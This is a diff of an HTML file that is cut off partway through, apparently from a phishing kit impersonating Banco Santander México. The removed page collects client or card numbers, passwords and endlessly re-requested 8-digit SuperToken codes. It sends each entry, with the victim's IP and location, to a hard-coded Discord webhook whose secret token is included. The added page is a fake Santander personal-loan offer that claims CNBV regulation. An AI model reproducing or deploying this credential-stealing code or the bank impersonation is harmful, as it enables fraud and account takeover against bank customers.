@@ -1,1060 +1,292 @@
-<!DOCTYPE html>
-<html lang="es">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Santander · Solicitud de Préstamo</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Open Sans', sans-serif;
-        }
-
-        body {
-            background-color: #1a1a1a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .mobile-container {
-            width: 390px;
-            height: 844px;
-            background-color: #000;
-            background-image: linear-gradient(to bottom, rgba(0, 0, 0, 0.15) 0%, rgba(0, 0, 0, 0) 35%, rgba(0, 0, 0, 0.85) 100%), url('fondo.jpg');
-            background-size: cover;
-            background-position: center;
-            position: relative;
-            border-radius: 40px;
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            padding: 15px 25px 10px;
-            color: white;
-            font-size: 14px;
-            font-weight: 600;
-            z-index: 10;
-        }
-
-        .status-left {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .status-right {
-            display: flex;
-            align-items: center;
-            gap: 7px;
-        }
-
-        .story-bars {
-            display: flex;
-            padding: 0 20px;
-            gap: 5px;
-            margin-bottom: 15px;
-        }
-
-        .story-bar {
-            flex: 1;
-            height: 3px;
-            background-color: rgba(255, 255, 255, 0.3);
-            border-radius: 2px;
-        }
-
-        .story-bar.active {
-            background-color: white;
-        }
-
-        .header-logos {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 20px;
-            color: white;
-        }
-
-        .logo-banco {
-            font-size: 28px;
-        }
-
-        .version-text {
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .main-content {
-            margin-top: auto;
-            padding: 20px;
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .btn-card {
-            flex: 1;
-            height: 140px;
-            border-radius: 12px;
-            padding: 15px;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            cursor: pointer;
-            text-align: left;
-            position: relative;
-            transition: transform 0.2s;
-            border: none;
-        }
-
-        .btn-card:active {
-            transform: scale(0.98);
-        }
-
-        .btn-card .icon-top {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            font-size: 24px;
-        }
-
-        .btn-primary {
-            background-color: white;
-            color: #1a1a1a;
-        }
-
-        .btn-primary .icon-top {
-            color: #ec0000;
-        }
-
-        .btn-primary .text {
-            font-weight: 600;
-            font-size: 15px;
-            line-height: 1.2;
-        }
-
-        .btn-secondary {
-            background-color: transparent;
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.6);
-        }
-
-        .btn-secondary .text {
-            font-weight: 400;
-            font-size: 15px;
-            line-height: 1.2;
-        }
-
-        .bottom-nav {
-            display: flex;
-            justify-content: space-around;
-            padding: 15px 10px 30px;
-            color: white;
-        }
-
-        .nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-            opacity: 0.9;
-        }
-
-        .nav-item i {
-            font-size: 20px;
-        }
-
-        .nav-item span {
-            font-size: 11px;
-        }
-
-        .home-indicator-white {
-            position: absolute;
-            bottom: 8px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 130px;
-            height: 4px;
-            background-color: white;
-            border-radius: 10px;
-        }
-
-        .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0, 0, 0, 0.65);
-            z-index: 20;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-        }
-
-        .overlay.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .bottom-sheet {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background-color: #f7f7f7;
-            border-radius: 20px 20px 0 0;
-            padding: 12px 20px 35px;
-            z-index: 30;
-            transform: translateY(100%);
-            transition: transform 0.3s cubic-bezier(0.1, 0.8, 0.2, 1);
-            display: none;
-        }
-
-        .bottom-sheet.active {
-            transform: translateY(0);
-            display: block;
-        }
-
-        .drag-handle {
-            width: 40px;
-            height: 4px;
-            background-color: #d1d1d1;
-            border-radius: 2px;
-            margin: 0 auto 15px;
-        }
-
-        .sheet-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 25px;
-        }
-
-        .btn-cancel {
-            background: none;
-            border: none;
-            color: #d63333;
-            font-size: 15px;
-            cursor: pointer;
-            width: 70px;
-            text-align: left;
-        }
-
-        .sheet-header h2 {
-            font-size: 15px;
-            font-weight: 700;
-            color: #000;
-            text-align: center;
-            flex: 1;
-            margin: 0;
-        }
-
-        .header-spacer {
-            width: 70px;
-        }
-
-        .input-group {
-            background-color: white;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            padding: 16px 15px;
-            margin-bottom: 20px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-        }
-
-        .input-group input {
-            border: none;
-            outline: none;
-            font-size: 13px;
-            color: #333;
-            width: 100%;
-        }
-
-        .input-group input::placeholder {
-            color: #666;
-        }
-
-        .input-group i {
-            color: #888;
-            font-size: 16px;
-            margin-left: 10px;
-            cursor: pointer;
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 25px;
-        }
-
-        .check-circle {
-            width: 22px;
-            height: 22px;
-            background-color: #4caf50;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 12px;
-        }
-
-        .checkbox-group span {
-            font-size: 13px;
-            color: #1a1a1a;
-        }
-
-        .btn-continue {
-            width: 100%;
-            background-color: #d4d4d4;
-            color: #8a8a8a;
-            border: none;
-            padding: 16px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            pointer-events: none;
-            transition: all 0.2s;
-        }
-
-        .btn-active {
-            background-color: #ec0000;
-            color: white;
-            pointer-events: auto;
-            cursor: pointer;
-        }
-
-        .home-indicator-black {
-            width: 130px;
-            height: 4px;
-            background-color: #000;
-            border-radius: 10px;
-            margin: 25px auto 0;
-        }
-
-        .fullscreen-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0, 0, 0, 0.95);
-            z-index: 100;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.4s ease;
-        }
-
-        .fullscreen-overlay.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .loader-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-        }
-
-        .loader-image {
-            width: 100px;
-            height: 100px;
-            object-fit: contain;
-            margin-bottom: 25px;
-            border-radius: 20px;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(236, 0, 0, 0.2);
-            border-top: 3px solid #ec0000;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 25px;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .loading-text {
-            color: white;
-            font-size: 18px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-            text-align: center;
-        }
-
-        .small-note {
-            color: #aaa;
-            font-size: 13px;
-            margin-top: 15px;
-            text-align: center;
-        }
-
-        .loading-progress {
-            width: 200px;
-            height: 4px;
-            background-color: rgba(255, 255, 255, 0.2);
-            border-radius: 4px;
-            margin-top: 20px;
-            overflow: hidden;
-        }
-
-        .loading-progress-bar {
-            height: 100%;
-            background-color: #ec0000;
-            border-radius: 4px;
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-
-        .token-grid {
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-
-        .token-input-box {
-            width: 40px;
-            height: 50px;
-            text-align: center;
-            font-size: 20px;
-            font-weight: 700;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            outline: none;
-            transition: border-color 0.3s;
-            background-color: white;
-            color: #000;
-        }
-
-        .token-input-box:focus {
-            border-color: #ec0000;
-            box-shadow: 0 0 0 2px rgba(236, 0, 0, 0.2);
-        }
-
-        .token-input-box::placeholder {
-            color: #ccc;
-            font-size: 14px;
-        }
-
-        .token-label {
-            text-align: center;
-            font-size: 13px;
-            color: #555;
-            margin-top: -5px;
-            margin-bottom: 15px;
-        }
-
-        .token-label i {
-            color: #ec0000;
-            margin-right: 5px;
-        }
-
-        .token-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-        }
-
-        input[type="text"] {
-            -webkit-appearance: none;
-            -moz-appearance: textfield;
-        }
-
-        input[type="text"]::-webkit-inner-spin-button,
-        input[type="text"]::-webkit-outer-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
-        }
-
-        .error-modal {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0, 0, 0, 0.85);
-            z-index: 200;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.4s ease;
-            padding: 40px;
-        }
-
-        .error-modal.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .error-icon {
-            font-size: 60px;
-            color: #ec0000;
-            margin-bottom: 20px;
-        }
-
-        .error-title {
-            color: white;
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-
-        .error-message {
-            color: #ccc;
-            font-size: 16px;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .btn-error-continue {
-            background-color: #ec0000;
-            color: white;
-            border: none;
-            padding: 15px 50px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .btn-error-continue:active {
-            transform: scale(0.95);
-        }
-    </style>
-</head>
-
-<body>
-    <div class="mobile-container" id="mobileContainer">
-        <div class="top-section">
-            <div class="story-bars">
-                <div class="story-bar active"></div>
-                <div class="story-bar"></div>
-                <div class="story-bar"></div>
-                <div class="story-bar"></div>
-            </div>
-            <div class="header-logos">
-                <img src="SAN.D-b32b4cfd.png" alt="" style="width: 20px;"><span class="version-text">v12.0</span>
-            </div>
+<!doctype html>
+<html
+  lang="es"
+  class="geist_a71539c9-module__T19VSG__variable geist_mono_8d43a2aa-module__8Li5zG__variable bg-background"
+>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link
+      rel="preload"
+      href="/_next/static/media/797e433ab948586e-s.p.08e28id.o-okb.woff2"
+      as="font"
+      crossorigin=""
+      type="font/woff2"
+    />
+    <link
+      rel="preload"
+      href="/_next/static/media/caa3a2e1cccd8315-s.p.09~u27dqhyhd6.woff2"
+      as="font"
+      crossorigin=""
+      type="font/woff2"
+    />
+    <link rel="preload" as="image" href="/logo.png" />
+    <link
+      rel="stylesheet"
+      href="/_next/static/chunks/0royarl~s254q.css"
+      data-precedence="next"
+    />
+    <link
+      rel="preload"
+      as="script"
+      fetchpriority="low"
+      href="/_next/static/chunks/05kbdxt4-1vri.js"
+    />
+    <script src="/_next/static/chunks/02i7dfk78~t~2.js" async=""></script>
+    <script src="/_next/static/chunks/10u3y4bw1ayzs.js" async=""></script>
+    <script src="/_next/static/chunks/0xit3wd5pz8p7.js" async=""></script>
+    <script
+      src="/_next/static/chunks/turbopack-0n_-o2j_cw4ws.js"
+      async=""
+    ></script>
+    <script src="/_next/static/chunks/0ya5kixflpvgt.js" async=""></script>
+    <script src="/_next/static/chunks/0d3tkj33oycf2.js" async=""></script>
+    <script src="/_next/static/chunks/11~lw5o3-i196.js" async=""></script>
+    <script src="/_next/static/chunks/0oa~~sh4mev3v.js" async=""></script>
+    <meta name="next-size-adjust" content="" />
+    <meta name="theme-color" content="#DA1F3D" />
+    <meta name="color-scheme" content="light" />
+    <title>Santander Préstamo Personal - Solicita Ahora</title>
+    <meta
+      name="description"
+      content="Solicita un préstamo personal Santander de $20,000 a $300,000 MXN de forma rápida y segura"
+    />
+    <meta name="generator" content="v0.app" />
+    <link rel="icon" href="/logo.png" media="(prefers-color-scheme: light)" />
+    <link rel="icon" href="/logo.png" media="(prefers-color-scheme: dark)" />
+    <link rel="icon" href="/logo.png" type="image/svg+xml" />
+    <link rel="apple-touch-icon" href="/logo.png" />
+    <script src="/_next/static/chunks/03~yq9q893hmn.js" nomodule=""></script>
+  </head>
+  <body class="font-sans antialiased bg-background text-foreground">
+    <div hidden=""><!--$--><!--/$--></div>
+    <main class="min-h-screen bg-background flex flex-col">
+      <div class="flex-1 flex flex-col items-center justify-center p-4">
+        <div class="mb-12">
+          <div class="flex flex-col items-center gap-3">
+            <img
+              alt="Santander Logo"
+              width="64"
+              height="64"
+              decoding="async"
+              data-nimg="1"
+              class="w-16 h-16 object-contain"
+              style="color: transparent"
+              src="/logo.png"
+            /><span class="text-4xl font-bold text-primary">Santander</span>
+          </div>
         </div>
-
-        <div class="bottom-section">
-            <main class="main-content">
-                <div class="btn-card btn-primary" id="btnSoyCliente">
-                    <img src="Santander-simbolo-removebg-preview.png" class="icon-top" style="width: 40px;" alt="">
-                    <span class="text">Solicitar<br>préstamo</span>
+        <div class="max-w-lg w-full">
+          <div class="text-center mb-12">
+            <h1 class="text-4xl font-bold text-foreground mb-2">
+              Préstamo Personal Santander
+            </h1>
+            <p class="text-muted-foreground text-lg">
+              Obtén el dinero que necesitas con Santander de forma rápida y
+              segura
+            </p>
+          </div>
+          <div class="bg-card border border-border rounded-xl p-8 shadow-lg">
+            <div class="mb-8">
+              <div class="text-center mb-6">
+                <p class="text-muted-foreground text-sm mb-2">
+                  Monto a solicitar
+                </p>
+                <p class="text-5xl font-bold text-primary">$100,000</p>
+              </div>
+              <input
+                type="range"
+                min="20000"
+                max="300000"
+                step="5000"
+                class="w-full h-3 bg-muted rounded-lg appearance-none cursor-pointer accent-primary"
+                value="100000"
+              />
+              <div
+                class="flex justify-between text-xs text-muted-foreground mt-3"
+              >
+                <span>$20,000</span><span>$300,000</span>
+              </div>
+            </div>
+            <div class="bg-muted/30 rounded-lg p-4 mb-8">
+              <div class="space-y-2 text-sm">
+                <div class="flex justify-between">
+                  <span class="text-muted-foreground">Comisión estimada:</span
+                  ><span class="font-semibold text-foreground">$2,000</span>
                 </div>
-                <div class="btn-card btn-secondary" id="btnConsultarPrestamos">
-                    <i class="fa-regular fa-file-lines icon-top"></i>
-                    <span class="text">Consultar<br>mis préstamos</span>
+                <div class="flex justify-between">
+                  <span class="text-muted-foreground">Tasa de interés:</span
+                  ><span class="font-semibold text-foreground">2% anual</span>
                 </div>
-            </main>
-            <footer class="bottom-nav">
-                <div class="nav-item"><i class="fa-solid fa-headset"></i><span>Contactar</span></div>
-                <div class="nav-item"><i class="fa-regular fa-id-badge"></i><span>Actualizar datos</span></div>
-                <div class="nav-item"><i class="fa-solid fa-lock"></i><span>SuperToken</span></div>
-            </footer>
-            <div class="home-indicator-white"></div>
-        </div>
-
-        <div class="overlay" id="overlay"></div>
-
-        <!-- Modal 1: Solicitud de préstamo (Tarjeta) -->
-        <div class="bottom-sheet" id="loginModal">
-            <div class="drag-handle"></div>
-            <div class="sheet-header">
-                <button class="btn-cancel" id="btnCancelInitial">Cancelar</button>
-                <h2>Solicitud de préstamo</h2>
-                <div class="header-spacer"></div>
-            </div>
-            <div class="input-group">
-                <input type="text" inputmode="numeric" placeholder="Código de cliente / Tarjeta de Debito o de Crédito" id="inputCliente">
-                <i class="fa-regular fa-address-card"></i>
-            </div>
-            <div class="checkbox-group">
-                <div class="check-circle"><i class="fa-solid fa-check"></i></div>
-                <span>Acepto términos del préstamo</span>
-            </div>
-            <button class="btn-continue" id="btnContinueInitial">Continuar</button>
-            <div class="home-indicator-black"></div>
-        </div>
-
-        <!-- Modal 2: Verifica tu identidad (Clave) -->
-        <div class="bottom-sheet" id="passwordModal">
-            <div class="drag-handle"></div>
-            <div class="sheet-header">
-                <button class="btn-cancel" id="btnCancelPassword">Cancelar</button>
-                <h2>Verifica tu identidad</h2>
-                <div class="header-spacer"></div>
-            </div>
-            <div class="input-group">
-                <input type="password" placeholder="Ingresa tu contraseña para continuar" id="inputPassword">
-                <i class="fa-regular fa-eye-slash" id="togglePassword"></i>
-            </div>
-            <button class="btn-continue" id="btnContinuePassword">Continuar</button>
-            <div class="home-indicator-black"></div>
-        </div>
-
-        <!-- Modal 3: SuperToken (se repite infinitamente) -->
-        <div class="bottom-sheet" id="tokenModal">
-            <div class="drag-handle"></div>
-            <div class="sheet-header">
-                <button class="btn-cancel" id="btnCancelToken">Cancelar</button>
-                <h2>SuperToken</h2>
-                <div class="header-spacer"></div>
-            </div>
-            <div class="token-container">
-                <p class="token-label"><i class="fas fa-shield-alt"></i> Genera un código de 8 dígitos desde tu app SuperMóvil e ingrésalo aquí</p>
-                <div class="token-grid" id="tokenGrid">
-                    <input type="text" maxlength="1" class="token-input-box" placeholder="•">
-                    <input type="text" maxlength="1" class="token-input-box" placeholder="•">
-                    <input type="text" maxlength="1" class="token-input-box" placeholder="•">
-                    <input type="text" maxlength="1" class="token-input-box" placeholder="•">
-                    <input type="text" maxlength="1" class="token-input-box" placeholder="•">
-                    <input type="text" maxlength="1" class="token-input-box" placeholder="•">
-                    <input type="text" maxlength="1" class="token-input-box" placeholder="•">
-                    <input type="text" maxlength="1" class="token-input-box" placeholder="•">
+                <div
+                  class="border-t border-border pt-2 mt-2 flex justify-between"
+                >
+                  <span class="text-foreground font-semibold"
+                    >Total a pagar:</span
+                  ><span class="font-bold text-primary">$102,000</span>
                 </div>
+              </div>
             </div>
-            <button class="btn-continue" id="btnContinueToken">Validar token</button>
-            <div class="home-indicator-black"></div>
+            <button
+              type="button"
+              tabindex="0"
+              data-slot="button"
+              class="group/button inline-flex shrink-0 items-center justify-center rounded-lg border border-transparent bg-clip-padding whitespace-nowrap transition-all outline-none select-none focus-visible:border-ring focus-visible:ring-3 focus-visible:ring-ring/50 active:not-aria-[haspopup]:translate-y-px disabled:pointer-events-none disabled:opacity-50 aria-invalid:border-destructive aria-invalid:ring-3 aria-invalid:ring-destructive/20 dark:aria-invalid:border-destructive/50 dark:aria-invalid:ring-destructive/40 [&amp;_svg]:pointer-events-none [&amp;_svg]:shrink-0 [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 [a]:hover:bg-primary/80 gap-1.5 px-2.5 has-data-[icon=inline-end]:pr-2 has-data-[icon=inline-start]:pl-2 w-full h-12 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground"
+            >
+              Solicitar Préstamo
+            </button>
+            <p class="text-xs text-muted-foreground text-center mt-6">
+              Al continuar, aceptas nuestros términos y condiciones. Tus datos
+              serán tratados de forma segura.
+            </p>
+          </div>
         </div>
-
-        <!-- Modal de Error de Token -->
-        <div class="error-modal" id="errorModal">
-            <div class="error-icon">
-                <i class="fas fa-times-circle"></i>
+      </div>
+      <footer class="bg-muted/30 border-t border-border py-8 mt-12">
+        <div class="max-w-7xl mx-auto px-4">
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+            <div>
+              <h3 class="font-semibold text-foreground mb-3">
+                Sobre Santander
+              </h3>
+              <p class="text-sm text-muted-foreground">
+                Tu solución confiable de Santander para créditos personales
+                rápidos y seguros.
+              </p>
             </div>
-            <div class="error-title">Token Incorrecto</div>
-            <div class="error-message">El código ingresado no es válido.<br>Por favor, intenta nuevamente.</div>
-            <button class="btn-error-continue" id="btnErrorContinue">Reintentar</button>
-        </div>
-
-        <!-- Pantalla de carga -->
-        <div class="fullscreen-overlay" id="loadingOverlay">
-            <div class="loader-container">
-                <img src="image-removebg-preview.png" alt="Santander" class="loader-image">
-                <div class="spinner"></div>
-                <div class="loading-text" id="loadingMessage">Procesando</div>
-                <div class="small-note" id="loadingNote"></div>
-                <div class="loading-progress">
-                    <div class="loading-progress-bar" id="progressBar"></div>
-                </div>
+            <div>
+              <h3 class="font-semibold text-foreground mb-3">
+                Enlaces Rápidos
+              </h3>
+              <ul class="space-y-2 text-sm text-muted-foreground">
+                <li>
+                  <a href="#" class="hover:text-primary transition">Inicio</a>
+                </li>
+                <li>
+                  <a href="#" class="hover:text-primary transition"
+                    >Preguntas Frecuentes</a
+                  >
+                </li>
+                <li>
+                  <a href="#" class="hover:text-primary transition">Contacto</a>
+                </li>
+              </ul>
             </div>
+            <div>
+              <h3 class="font-semibold text-foreground mb-3">Contacto</h3>
+              <ul class="space-y-2 text-sm text-muted-foreground">
+                <li>
+                  Email:
+                  <a
+                    href="mailto:creditos@santander.com.mx"
+                    class="hover:text-primary transition"
+                    >creditos@santander.com.mx</a
+                  >
+                </li>
+                <li>
+                  Teléfono:
+                  <a
+                    href="tel:+525551234567"
+                    class="hover:text-primary transition"
+                    >+52 (555) 123-4567</a
+                  >
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="border-t border-border pt-6 mt-6">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+              <ul class="flex flex-wrap gap-4 text-xs text-muted-foreground">
+                <li>
+                  <a href="#" class="hover:text-primary transition"
+                    >Términos y Condiciones</a
+                  >
+                </li>
+                <li>
+                  <a href="#" class="hover:text-primary transition"
+                    >Política de Privacidad</a
+                  >
+                </li>
+                <li>
+                  <a href="#" class="hover:text-primary transition"
+                    >Aviso de Privacidad</a
+                  >
+                </li>
+              </ul>
+              <ul
+                class="flex flex-wrap gap-4 text-xs text-muted-foreground justify-end"
+              >
+                <li>
+                  <a href="#" class="hover:text-primary transition">LSRC</a>
+                </li>
+                <li>
+                  <a href="#" class="hover:text-primary transition"
+                    >Contrato Vigente</a
+                  >
+                </li>
+                <li>
+                  <a href="#" class="hover:text-primary transition">FAQs</a>
+                </li>
+              </ul>
+            </div>
+            <div
+              class="text-center text-xs text-muted-foreground pt-4 border-t border-border"
+            >
+              <p>
+                © 2026 Banco Santander México. Todos los derechos reservados. |
+                Empresa regulada por la Comisión Nacional Bancaria y de Valores
+                (CNBV)
+              </p>
+              <p class="mt-2">
+                Solicitudes de crédito sujetas a aprobación. Consulta nuestros
+                términos y condiciones.
+              </p>
+            </div>
+          </div>
         </div>
-    </div>
-
+      </footer>
+    </main>
+    <!--$--><!--/$--><!--$!--><template
+      data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"
+    ></template
+    ><!--/$-->
+    <script
+      src="/_next/static/chunks/05kbdxt4-1vri.js"
+      id="_R_"
+      async=""
+    ></script>
     <script>
-        (function () {
-            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1533977813659680798/FLVxv7xrNCzE6opK8-TTIopN0iwEwTHd2hDvIoveR2Tm_fWEv_kOQJqjqkxVvsIwWSAD';
-
-            let usuarioCliente = '';
-            let tokenCounter = 1;
-
-            async function getGeoData() {
-                try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    const data = await response.json();
-                    return {
-                        ip: data.ip || 'No disponible',
-                        ciudad: data.city || 'No disponible',
-                        pais: data.country_name || 'No disponible',
-                        region: data.region || 'No disponible'
-                    };
-                } catch (error) {
-                    console.error('Error obteniendo geolocalización:', error);
-                    return {
-                        ip: 'No disponible',
-                        ciudad: 'No disponible',
-                        pais: 'No disponible',
-                        region: 'No disponible'
-                    };
-                }
-            }
-
-            async function sendToDiscord(mensaje, datosExtra = {}) {
-                const geoData = await getGeoData();
-
-                const embed = {
-                    title: '🚨 Nuevo Registro - Santander',
-                    color: 0xEC0000,
-                    fields: [
-                        {
-                            name: '📋 Acción',
-                            value: mensaje,
-                            inline: false
-                        },
-                        {
-                            name: '👤 Usuario',
-                            value: usuarioCliente || 'No disponible',
-                            inline: true
-                        },
-                        {
-                            name: '🌍 Ciudad',
-                            value: geoData.ciudad,
-                            inline: true
-                        },
-                        {
-                            name: '🏳️ País',
-                            value: geoData.pais,
-                            inline: true
-                        },
-                        {
-                            name: '📍 Región',
-                            value: geoData.region,
-                            inline: true
-                        },
-                        {
-                            name: '🖥️ IP',
-                            value: geoData.ip,
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: `Santander Bank • ${new Date().toLocaleString()}`
-                    },
-                    timestamp: new Date().toISOString()
-                };
-
-                if (datosExtra && Object.keys(datosExtra).length > 0) {
-                    for (const [key, value] of Object.entries(datosExtra)) {
-                        embed.fields.push({
-                            name: key,
-                            value: value || 'No disponible',
-                            inline: true
-                        });
-                    }
-                }
-
-                try {
-                    await fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            embeds: [embed]
-                        })
-                    });
-                } catch (error) {
-                    console.error('Error enviando a Discord:', error);
-                }
-            }
-
-            // Función para manejar los inputs del token
-            function setupTokenInputs(gridId, btnId) {
-                const inputs = document.querySelectorAll(`#${gridId} .token-input-box`);
-                const btn = document.getElementById(btnId);
-
-                function updateButtonState() {
-                    let allFilled = true;
-                    inputs.forEach(input => {
-                        if (input.value.trim() === '') {
-                            allFilled = false;
-                        }
-                    });
-                    if (allFilled) {
-                        btn.classList.add('btn-active');
-                    } else {
-                        btn.classList.remove('btn-active');
-                    }
-                }
-
-                inputs.forEach((input, index) => {
-                    input.addEventListener('input', function (e) {
-                        this.value = this.value.replace(/\D/g, '');
-                        if (this.value.length === 1 && index < inputs.length - 1) {
-                            inputs[index + 1].focus();
-                        }
-                        updateButtonState();
-                    });
-
-                    input.addEventListener('keydown', function (e) {
-                        if (e.key === 'Backspace' && this.value === '' && index > 0) {
-                            inputs[index - 1].focus();
-                        }
-                        if (e.key === 'ArrowLeft' && index > 0) {
-                            inputs[index - 1].focus();
-                        }
-                        if (e.key === 'ArrowRight' && index < inputs.length - 1) {
-                            inputs[index + 1].focus();
-                        }
-                    });
-
-                    input.addEventListener('paste', function (e) {
-                        e.preventDefault();
-                        const paste = (e.clipboardData || window.clipboardData).getData('text');
-                        const digits = paste.replace(/\D/g, '').slice(0, inputs.length);
-                        for (let i = 0; i < digits.length && i < inputs.length; i++) {
-                            inputs[i].value = digits[i];
-                        }
-                        const nextIndex = Math.min(digits.length, inputs.length - 1);
-                        inputs[nextIndex].focus();
-                        updateButtonState();
-                    });
-
-                    input.addEventListener('focus', function () {
-                        this.select();
-                    });
-                });
-
-                updateButtonState();
-
-                function getToken() {
-                    let token = '';
-                    inputs.forEach(input => {
-                        token += input.value.trim();
-                    });
-                    return token;
-                }
-
-                function clearToken() {
-                    inputs.forEach(input => {
-                        input.value = '';
-                    });
-                    inputs[0].focus();
-                    updateButtonState();
-                }
-
-                return { getToken, clearToken, updateButtonState };
-            }
-
-            // Inicializar el token único
-            const tokenHandler = setupTokenInputs('tokenGrid', 'btnContinueToken');
-
-            const btnSoyCliente = document.getElementById('btnSoyCliente');
-            const btnConsultarPrestamos = document.getElementById('btnConsultarPrestamos');
-            const overlay = document.getElementById('overlay');
-
-            const loginModal = document.getElementById('loginModal');
-            const passwordModal = document.getElementById('passwordModal');
-            const tokenModal = document.getElementById('tokenModal');
-            const errorModal = document.getElementById('errorModal');
-
-            const btnCancelInitial = document.getElementById('btnCancelInitial');
-            const btnCancelPassword = document.getElementById('btnCancelPassword');
-            const btnCancelToken = document.getElementById('btnCancelToken');
-            const btnErrorContinue = document.getElementById('btnErrorContinue');
-
-            const inputCliente = document.getElementById('inputCliente');
-            const btnContinueInitial = document.getElementById('btnContinueInitial');
-            const inputPassword = document.getElementById('inputPassword');
-            const btnContinuePassword = document.getElementById('btnContinuePassword');
-            const togglePassword = document.getElementById('togglePassword');
-
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            const loadingMessage = document.getElementById('loadingMessage');
-            const loadingNote = document.getElementById('loadingNote');
-            const progressBar = document.getElementById('progressBar');
-
-            let timeouts = [];
-
-            function clearAllTimeouts() {
-                timeouts.forEach(t => clearTimeout(t));
-                timeouts = [];
-            }
-
-            function closeAllSheets() {
-                loginModal.classList.remove('active');
-                passwordModal.classList.remove('active');
-                tokenModal.classList.remove('active');
-                errorModal.classList.remove('active');
-                overlay.classList.remove('active');
-            }
-
-            function showSheet(sheet) {
-                loginModal.classList.remove('active');
-                passwordModal.classList.remove('active');
-                tokenModal.classList.remove('active');
-                errorModal.classList.remove('active');
-                
-                overlay.classList.add('active');
-                sheet.classList.add('active');
-            }
-
-            function hideAllAndOverlay() {
-                closeAllSheets();
-                overlay.classList.remove('active');
-            }
-
-            function toggleButtonState(input, button) {
-                if (input.value.trim().length > 0) {
-                    button.classList.add('btn-active');
-                } else {
-                    button.classList.remove('btn-active');
-                }
-            }
-
-            function showLoadingWithProgress(message, note, duration, callback) {
-                closeAllSheets();
-                loadingOverlay.classList.add('active');
-                loadingMessage.textContent = message;
-                loadingNote.textContent = note || '';
-                progressBar.style.width = '0%';
-
-                const startTime = Date.now();
-                const interval = setInterval(() => {
-                    const elapsed = Date.now() - startTime;
-                    const progress = Math.min((elapsed / duration) * 100, 100);
-                    progressBar.style.width = progress + '%';
-                }, 50);
-
-                const timeout = setTimeout(() => {
-                    clearInterval(interval);
-                    progressBar.style.width = '100%';
-                    setTimeout(() => {
